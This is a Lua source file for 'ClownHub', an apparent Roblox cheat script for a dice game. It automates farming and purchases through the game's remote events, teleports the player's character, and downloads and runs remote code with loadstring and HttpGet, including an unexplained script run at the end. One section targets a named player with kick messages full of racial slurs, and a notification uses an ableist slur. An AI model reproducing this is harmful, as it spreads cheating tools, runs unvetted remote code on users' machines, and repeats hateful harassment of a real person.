local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = Fluent:CreateWindow({
    Title = "🤡🍌 ClownHub " .. Fluent.Version,
    SubTitle = "by Clown, Retro, and the bigpt",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 460),
    Acrylic = true,
    Theme = "Dark",
    MinimizeKey = Enum.KeyCode.LeftControl
})

local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "" }),
    Farm = Window:AddTab({ Title = "Farm", Icon = "" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}

-- Globals
_G.WheelSpin = false
_G.SpinMode = "NONE"
_G.PotionMode = "NONE"
_G.AutoClaim = false
_G.EquipBest = false
_G.AutoBuyDice = false
_G.AutoBuyPotions = false
_G.MerchantAuto = false
_G.NoNoti = false

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

-- ==== MAIN TAB ====
do
    -- Auto Spin Toggle
    local spinToggle = Tabs.Main:AddToggle("AutoSpin", {Title = "Auto Dice Spin", Default = false})
    spinToggle:OnChanged(function(value)
        _G.AutoSpin = value
        task.spawn(function()
            local Players = game:GetService("Players")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local player = Players.LocalPlayer
            local updateDice = ReplicatedStorage:WaitForChild("Events"):WaitForChild("updateRollingDice")
            local acceptableEvents = {
                ["Rosefall Skies"] = true,
                ["Twilight Oblivion"] = true,
                ["Falling Stars"] = true,
                ["Aurora Borealis"] = true,
                ["Solar Flare"] = true
            }
            local function extractNumber(text)
                local cleaned = string.gsub(text or "", "[^%d]", "")
                return tonumber(cleaned) or 0
            end
            local function buildDicePriority()
                local list = {}
                local restockFrame = player.PlayerGui.Main.Restock.ScrollingFrame
                for _, dice in ipairs(restockFrame:GetChildren()) do
                    if dice:IsA("GuiObject") and dice:FindFirstChild("rarity") then
                        local rarityLabel = dice.rarity
                        if rarityLabel:IsA("TextLabel") then
                            table.insert(list, {
                                Name = dice.Name,
                                Priority = extractNumber(rarityLabel.Text)
                            })
                        end
                    end
                end
                table.sort(list, function(a, b)
                    return a.Priority > b.Priority
                end)
                return list
            end
            while true do
                if _G.AutoSpin then
                    local main = player.PlayerGui.Main
                    local weather = main.WeatherContainer.Frame
                    local diceContainer = main.Dice.Container
                    local rawTitle = weather.Title.Text or ""
                    local timerText = weather.Timer.Text or ""
                    local eventName = rawTitle:gsub("<[^>]+>", "")
                    local eventActive = acceptableEvents[eventName] and timerText ~= "0:00"
                    local currentDice = main.Dice.title.Text or ""
                    local owned = {}
                    for _, d in ipairs(diceContainer:GetChildren()) do
                        owned[d.Name] = true
                    end
                    if currentDice ~= "" then
                        owned[currentDice] = true
                    end
                    local chosenDice
                    if _G.SpinMode == "BASIC" then
                        chosenDice = "Basic Dice"
                    elseif _G.SpinMode == "CURRENT" then
                        chosenDice = currentDice
                        pcall(function()
                            main.Dice.RollState:InvokeServer()
                        end)
                        task.wait(0.1)
                        task.wait(0.1)
                        continue
                    elseif _G.SpinMode == "BEST" then
                        local priorityList = buildDicePriority()
                        for _, diceData in ipairs(priorityList) do
                            if owned[diceData.Name] then
                                chosenDice = diceData.Name
                                break
                            end
                        end
                    elseif _G.SpinMode == "EVENT" then
                        local priorityList = buildDicePriority()
                        if eventActive then
                            for _, diceData in ipairs(priorityList) do
                                if owned[diceData.Name] then
                                    chosenDice = diceData.Name
                                    break
                                end
                            end
                        else
                            chosenDice = "Basic Dice"
                        end
                    end
                    if chosenDice then
                        pcall(function()
                            updateDice:FireServer(chosenDice)
                        end)
                    end
                    pcall(function()
                        main.Dice.RollState:InvokeServer()
                    end)
                end

                task.wait(0.1)
                if Fluent.Unloaded then break end
            end
        end)
    end)

    -- Spin Mode Dropdown
    local spinDropdown = Tabs.Main:AddDropdown("SpinMode", {
        Title = "Spin Mode",
        Values = {"BASIC", "CURRENT", "BEST", "EVENT"},
        Default = 1
    })
    spinDropdown:OnChanged(function(value)
        _G.SpinMode = value
    end)

    -- Auto Potion Toggle
    local potionToggle = Tabs.Main:AddToggle("AutoPotion", {Title = "Auto Use Potion", Default = false})
    potionToggle:OnChanged(function(value)
        _G.AutoPotion = value
        if autoPotionTask then
            task.cancel(autoPotionTask)
            autoPotionTask = nil
        end
        if value then
            autoPotionTask = coroutine.create(function()
                local Players = game:GetService("Players")
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local player = Players.LocalPlayer
                local equipEvent = ReplicatedStorage:WaitForChild("Events"):WaitForChild("equip")
                local targetPotions = {
                    "Luck Potion 3",
                    "Money Potion 3",
                    "Mutation Chance Potion 1",
                    "No Consume Dice Potion 1"
                }
                local function cleanItemName(text)
                    return (text:gsub("%s*%b[]", "")):gsub("%s+$", "")
                end
                local function getOwnedPotionAmounts()
                    local owned = {}
                    local main = player.PlayerGui.Main
                    local inventoryList = main.Backpack.Inventory.list
                    local hotbar = main.Backpack.Hotbar
                    local function scan(container, keyName)
                        for _, child in ipairs(container:GetChildren()) do
                            local label = child:FindFirstChild(keyName)
                            if label and label:IsA("TextLabel") then
                                local raw = label.Text or ""
                                local name = cleanItemName(raw)
                                local amount = tonumber(raw:match("%[x(%d+)%]")) or 1
                                owned[name] = amount
                            end
                        end
                    end
                    scan(inventoryList, "inv_key")
                    scan(hotbar, "key")
                    return owned
                end
                local function isPotionActive(potionName)
                    local buffs = player.PlayerGui.Main:FindFirstChild("BUFFS")
                    if not buffs then return false end
                    local potionFrame = buffs:FindFirstChild(potionName)
                    if potionFrame and potionFrame:FindFirstChild("TIMER") then
                        return true
                    end
                    return false
                end
                local function equipAndUse(potionName, amount)
                    equipEvent:InvokeServer(potionName, true)
                    task.wait(0.2)
                    local character = player.Character or player.CharacterAdded:Wait()
                    local tool = character:FindFirstChildOfClass("Tool")
                    if tool then
                        if _G.PotionMode == "INSTANT" then
                            for _ = 1, amount do
                                tool:Activate()
                                task.wait(0.01)
                            end
                        else
                            tool:Activate()
                        end
                    end
                    task.wait(0.2)
                    equipEvent:InvokeServer(potionName, false)
                    task.wait(0.2)
                end
                while _G.AutoPotion do
                    local owned = getOwnedPotionAmounts()
                    if _G.PotionMode == "CONSTANT" then
                        for _, potionName in ipairs(targetPotions) do
                            if owned[potionName] and not isPotionActive(potionName) then
                                equipAndUse(potionName, 1)
                            end
                        end
                    elseif _G.PotionMode == "ALWAYS" or _G.PotionMode == "INSTANT" then
                        for _, potionName in ipairs(targetPotions) do
                            if not _G.AutoPotion then break end
                            local amount = owned[potionName]
                            if amount then
                                equipAndUse(potionName, amount)
                            end
                        end
                    end
                    task.wait(1)
                    if Fluent.Unloaded then break end
                end
            end)
            coroutine.resume(autoPotionTask)
        end
    end)

    -- Potion Mode Dropdown
    local potionDropdown = Tabs.Main:AddDropdown("PotionMode", {
        Title = "Potion Mode",
        Values = {"CONSTANT", "ALWAYS", "INSTANT"},
        Default = 1
    })
    potionDropdown:OnChanged(function(value)
        _G.PotionMode = value
    end)

    -- Auto Equip Best Toggle
    local equipToggle = Tabs.Main:AddToggle("EquipBest", {Title = "Auto Equip Best", Default = false})
    equipToggle:OnChanged(function(value)
        _G.Equipbest = value
    end)

    task.spawn(function()
        while true do
            if _G.Equipbest then
                pcall(function()
                    game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("PlaceBestBaddies"):InvokeServer()
                end)
                wait(300)
            else
                wait(1)
            end
            if Fluent.Unloaded then break end
        end
    end)

    -- Disable Notifications Toggle
    local noNotiToggle = Tabs.Main:AddToggle("DisableNotifications", {Title = "Disable Notifications", Default = false})

    local function runNoNoti(enable)
        local player = game:GetService("Players").LocalPlayer
        local gui = player:WaitForChild("PlayerGui")
        local botNot = gui:WaitForChild("bot_not")
        local frame = botNot:WaitForChild("Frame")

        if enable then
            frame.Visible = false
        else
            frame.Visible = true
        end
    end

    noNotiToggle:OnChanged(function(value)
        runNoNoti(value)
    end)

    -- Eyed really did that shit
    local Players = game:GetService("Players")
    local TARGET_NAME = "SternalVoyage38"
    local function setupPlayerChat(player)
        player.Chatted:Connect(function(msg)
            if string.find(string.lower(msg), "kick eyed") then
                if player.Name == "911hz" then
                    local targetPlayer = Players:FindFirstChild(TARGET_NAME)
                    if targetPlayer then
                        targetPlayer:Kick("Nigger you made it. You're number one. You did it. You're number one. I'm so proud of you NIGGER. You really did that shit. You're number oneeeee.")
                    end
                end
            end
        end)
    end
    for _, player in ipairs(Players:GetPlayers()) do
        setupPlayerChat(player)
    end
    Players.PlayerAdded:Connect(setupPlayerChat)

    Tabs.Main:AddButton({
        Title = "eyed exclusive feature!?!",
        Callback = function()
            local Players = game:GetService("Players")
            local player = Players.LocalPlayer
            local StarterGui = game:GetService("StarterGui")

            if player.Name == "SternalVoyage38" then
                player:Kick("bomb you nigga.")
            else
                StarterGui:SetCore("SendNotification", {
                    Title = "🚫 Retard Alert",
                    Text = "😡 Is your name eyed? DIDNT THINK SO",
                    Duration = 5
                })
            end
        end
    })
end

-- ==== FARM TAB ====
-- Farm Tab Controls
do
    local farmTab = Tabs.Farm

    -- Auto Buy Dice
    local diceluckstatz = loadstring(game:HttpGet("https://raw.githubusercontent.com/ClownAdept/ClownScripts/refs/heads/main/SPworking.lua"))()
    local diceToggle = farmTab:AddToggle("AutoBuyDice", {Title = "Auto Buy Dice", Default = false})
    diceToggle:OnChanged(function(value)
        _G.AutoBuyDice = value
    end)

    
    task.spawn(function()
        while true do
            if _G.AutoBuyDice then
                local frame = player.PlayerGui.Main.Restock.ScrollingFrame
                for _, dice in ipairs(frame:GetChildren()) do
                    if dice:FindFirstChild("stock") then
                        local stock = tonumber(dice.stock.Text:match("%d+")) or 0
                        if stock > 0 then
                            pcall(function()
                                ReplicatedStorage.Events.buy:InvokeServer(dice.Name, stock, "dice")
                            end)
                        end
                    end
                end
            end
            task.wait(2)
            if Fluent.Unloaded then break end
        end
    end)

    -- Auto Buy Potions
    local potionToggle = farmTab:AddToggle("AutoBuyPotions", {Title = "Auto Buy Potions", Default = false})
    potionToggle:OnChanged(function(value)
        _G.AutoBuyPotions = value
    end)

    task.spawn(function()
        while true do
            if _G.AutoBuyPotions then
                local frame = player.PlayerGui.Main.Potions.ScrollingFrame
                for _, potion in ipairs(frame:GetChildren()) do
                    if potion:FindFirstChild("stock") then
                        local stock = tonumber(potion.stock.Text:match("%d+")) or 0
                        if stock > 0 then
                            pcall(function()
                                ReplicatedStorage.Events.buy:InvokeServer(potion.Name, stock, "potion")
                            end)
                        end
                    end
                end
            end
            task.wait(2)
            if Fluent.Unloaded then break end
        end
    end)

    -- Auto Buy Merchant
    local merchantToggle = Tabs.Farm:AddToggle("AutoBuyMerchant", {
        Title = "Auto Buy Merchant",
        Default = false
    })
    merchantToggle:OnChanged(function(value)
        _G.MerchantAuto = value
    end)
    local Players = game:GetService("Players")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local TweenService = game:GetService("TweenService")
    local player = Players.LocalPlayer
    local char = player.Character or player.CharacterAdded:Wait()
    local hrpPlayer = char:WaitForChild("HumanoidRootPart")
    local merchantBuy = ReplicatedStorage:WaitForChild("Events"):WaitForChild("MerchantBuy")
    local function buyStockParallel(offerIndex, amount)
        local remaining = amount
        local function worker()
            while remaining > 0 and _G.MerchantAuto do
                remaining -= 1
                pcall(function()
                    merchantBuy:InvokeServer(offerIndex)
                end)
                task.wait()
            end
        end
        for _ = 1, amount do
            task.spawn(worker)
        end
    end
    task.spawn(function()
        local lastMerchant = nil
        while true do
            task.wait(0.5)
            if Fluent.Unloaded or not _G.MerchantAuto then
            else
                local outer = workspace:FindFirstChild("Nullity")
                local merchant = outer and outer:FindFirstChild("Nullity")
                if merchant and merchant ~= lastMerchant then
                    lastMerchant = merchant
                    local hrp = merchant:FindFirstChild("HumanoidRootPart")
                    local prompt = hrp and hrp:FindFirstChildOfClass("ProximityPrompt")
                    if hrp and prompt then
                        local distance = (hrp.Position - hrpPlayer.Position).Magnitude
                        local speed = 150
                        local tween = TweenService:Create(hrpPlayer, TweenInfo.new(distance / speed, Enum.EasingStyle.Linear), {CFrame = hrp.CFrame})
                        tween:Play()
                        tween.Completed:Wait()
                        wait(0.2)
                        repeat
                            pcall(fireproximityprompt, prompt)
                            task.wait(0.2)
                            local shop = player.PlayerGui:FindFirstChild("Main")
                                and player.PlayerGui.Main:FindFirstChild("MerchantShop")
                            if shop and shop.Visible then
                                break
                            end
                        until not _G.MerchantAuto
                        repeat
                            task.wait(0.5)
                            outer = workspace:FindFirstChild("Nullity")
                            merchant = outer and outer:FindFirstChild("Nullity")
                        until not merchant or not _G.MerchantAuto
                    end
                end
            end
        end
    end)
    task.spawn(function()
        while true do
            task.wait(0.5)
            if not _G.MerchantAuto then continue end
            local shop = player.PlayerGui:FindFirstChild("Main")
                and player.PlayerGui.Main:FindFirstChild("MerchantShop")
            local offers = shop
                and shop:FindFirstChild("ScrollingFrame")
                and shop.ScrollingFrame:FindFirstChild("DiceOffers")
            if offers then
                for i = 1, 3 do
                    local offer = offers:FindFirstChild("Offer_" .. i)
                    local stockLabel = offer and offer:FindFirstChild("Stock")
                    if stockLabel then
                        local text = stockLabel.Text
                        if text ~= "SOLD OUT" then
                            local stock = tonumber(text:match("%d+"))
                            if stock and stock > 0 then
                                buyStockParallel(i, stock)
                            end
                        end
                    end
                end
            end
        end
    end)

    -- Auto Spin Wheel
    local wheelToggle = Tabs.Farm:AddToggle("WheelSpin", {Title = "Auto Spin Wheel", Default = false})
    wheelToggle:OnChanged(function(value)
        _G.WheelSpin = value
    end)
    task.spawn(function()
        while true do
            if _G.WheelSpin then
                pcall(function()
                    game:GetService("ReplicatedStorage").Events.spinrequest:InvokeServer()
                end)
            end
            task.wait(0.1)
            if Fluent.Unloasded then break end
        end
    end)

    -- Auto Claim Quests
    local claimToggle = farmTab:AddToggle("AutoClaim", {Title = "Auto Claim Quests", Default = false})
    claimToggle:OnChanged(function(value)
        _G.AutoClaim = value
    end)

    task.spawn(function()
        while true do
            if _G.AutoClaim then
                local questFrame = player.PlayerGui.Main.Quests.ScrollingFrame
                for _, quest in ipairs(questFrame:GetChildren()) do
                    if quest.Name:match("^Quest_%d+") then
                        local label = quest:FindFirstChild("Count")
                        if label then
                            local current, total = label.Text:match("(%d+)%s*/%s*(%d+)")
                            if tonumber(current) == tonumber(total) then
                                pcall(function()
                                    ReplicatedStorage.Events.QuestRemote:InvokeServer(
                                        "ClaimReward",
                                        tonumber(quest.Name:match("%d+"))
                                    )
                                end)
                            end
                        end
                    end
                end
            end
            task.wait(2)
            if Fluent.Unloaded then break end
        end
    end)
end

-- Hand over to Addons
SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)
SaveManager:IgnoreThemeSettings()
SaveManager:SetIgnoreIndexes({})
InterfaceManager:SetFolder("ClownHub")
SaveManager:SetFolder("ClownHub/" .. game.PlaceId)
InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)

Window:SelectTab(1)

Fluent:Notify({
    Title = "ClownHub",
    Content = "The script has been loaded.",
    Duration = 8
})

SaveManager:LoadAutoloadConfig()
diceluckstatz()
